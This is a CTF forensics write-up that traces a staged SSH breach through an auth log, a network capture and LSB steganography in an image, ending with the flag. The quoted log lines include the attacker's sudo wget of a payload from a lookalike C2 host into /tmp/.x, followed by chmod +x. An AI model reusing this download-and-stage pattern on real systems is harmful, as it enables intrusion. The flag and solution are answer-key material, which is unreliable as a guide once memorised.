# Operation Lazarus

**Category:** Forensics / Multi-stage / Steganography
**Points:** 500
**Author:** 0xTrinity_Zer0

## Problem Description

> On June 29, 2024, A production server was breached during a late-night shift. The SOC team captured everything they could before pulling the plug — a network dump, a suspicious image found in the attacker's temporary directory, and the server's authentication log. The attacker cleaned up. Deleted the payload. Wiped the shell history. But cleaning up is harder than it looks. Artifacts linger across layers that most people forget to check.
>
> Three files. One trail. Reconstruct what happened and what was left behind.

Provided files (`Operation_Lazarus.zip`):
- `auth.log` — server authentication log (sshd / sudo)
- `capture.pcap` — network capture
- `suspicious.png` — image dropped on disk by the attacker

## Approach

The flag is a single string scattered across three artifacts. The C2 protocol referenced
three URL-encoded fields — `part`, `key`, and `file` — each of which had to be located in
its own layer.

### Stage 1 — auth.log: the SSH break-in (part 1)

Filtering the log for successful auth, only one entry exists among thousands of brute-force attempts:

```
Jun 29 04:17:45 srv-prod01 sshd[4103]: Accepted password for j.morrison from 45.33.32.156 port 51337 ssh2
Jun 29 04:17:46 srv-prod01 sshd[4103]: pam_unix(sshd:session): session opened for user j.morrison by (uid=0)
Jun 29 04:17:48 srv-prod01 sudo:  j.morrison : TTY=pts/1 ; PWD=/home/j.morrison ; USER=root ; COMMAND=/usr/bin/wget 'http://svchost-cdn.net/payload?part=1&key=6e2e2e6e393169' -O /tmp/.x
Jun 29 04:17:51 srv-prod01 sudo:  j.morrison : TTY=pts/1 ; PWD=/home/j.morrison ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x
Jun 29 04:17:53 srv-prod01 sshd[4103]: Disconnected from user j.morrison 45.33.32.156 port 51337
```

The single accepted login was `j.morrison` from `45.33.32.156` after a long brute-force
campaign. The wget command leaked the first key fragment in the URL:

```
part=1   key=6e2e2e6e393169
```

### Stage 2 — capture.pcap: the C2 beacon (part 2)

The pcap is mostly DNS noise to lookalike domains. The interesting flow is to
`svchost-cdn.net` (45.33.32.156, the same attacker IP from auth.log):

```
POST /beacon HTTP/1.1
Host: svchost-cdn.net
...
Body (urlencoded form, base64-looking):
cGFydD0yJmtleT0yODA1MzY2OTNjMmUwNSZmaWxlPXN1c3BpY2lvdXMucG5n
```

Decoded:

```bash
$ echo cGFydD0yJmtleT0yODA1MzY2OTNjMmUwNSZmaWxlPXN1c3BpY2lvdXMucG5n | base64 -d
part=2&key=280536693c2e05&file=suspicious.png
```

The HTTP response body:

```
ok:xor=rv
```

So `part=2` carries another 7-byte hex fragment, names the file (`suspicious.png`), and
the response confirms the parts will need to be XOR-decoded.

### Stage 3 — suspicious.png: the dropped image (part 3)

Metadata was the first hint:

```bash
$ exiftool suspicious.png
Author    : j.morrison
Camera    : SONY ILCE-7M3
GPS       : 38.9517N 77.1461W
Comment   : part=3, encoded in preferred channel
```

`zsteg` finds two LSB strings in the first bit-plane:

```bash
$ zsteg suspicious.png
b1,r,lsb,xy   .. text: "deadbeefcafebabe"     <- decoy / marker
b1,g,lsb,xy   .. text: "6e052e286e6b36"        <- the real part 3
```

The red channel holds a `deadbeefcafebabe` magic-string decoy. The "preferred channel"
of the comment points to **green**, which carries the third fragment.

```
part=3   key=6e052e286e6b36
```

### Stage 4 — Reassemble and break the XOR

Concatenated in part order:

```
part1 + part2 + part3
= 6e2e2e6e393169  +  280536693c2e05  +  6e052e286e6b36
= 6e2e2e6e393169280536693c2e056e052e286e6b36   (21 bytes)
```

The pcap response said `xor=rv`. Trying to use `"rv"` as a literal repeating XOR key
produced gibberish, so I brute-forced the single-byte XOR space — the result is
clean ASCII for exactly one key:

```python
key = bytes.fromhex('6e2e2e6e393169280536693c2e056e052e286e6b36')
for x in range(256):
    out = bytes(b ^ x for b in key)
    if all(32 <= b <= 126 for b in out):
        print(hex(x), out)
```

```
0x5a  b'4tt4ck3r_l3ft_4_tr41l'
```

XOR with `0x5A` ('Z') yields the flag body. (Reading "rv" as the **r**everse **v**alue
of `0xa5 ^ 0xff = 0x5A` — or simply ignoring it as misdirection from the C2 server —
both lead here.)

## Flag

```
ROBOFEST{4tt4ck3r_l3ft_4_tr41l}
```

## Reconstructed timeline

| Time (UTC) | Event |
|---|---|
| 02:00 – 04:17 | Distributed SSH brute force against many users; `j.morrison` credentials sprayed from many IPs |
| 04:17:45 | Successful SSH login as `j.morrison` from `45.33.32.156` |
| 04:17:48 | `sudo wget http://svchost-cdn.net/payload?part=1&key=...` → `/tmp/.x` (leaks part 1) |
| 04:17:48 | C2 POST `/beacon` carrying part 2 + filename (captured in pcap) |
| 04:17:51 | `sudo chmod +x /tmp/.x` |
| 04:17:53 | Attacker disconnects |
| pre-attack | `suspicious.png` planted with part 3 hidden in the green channel LSB |

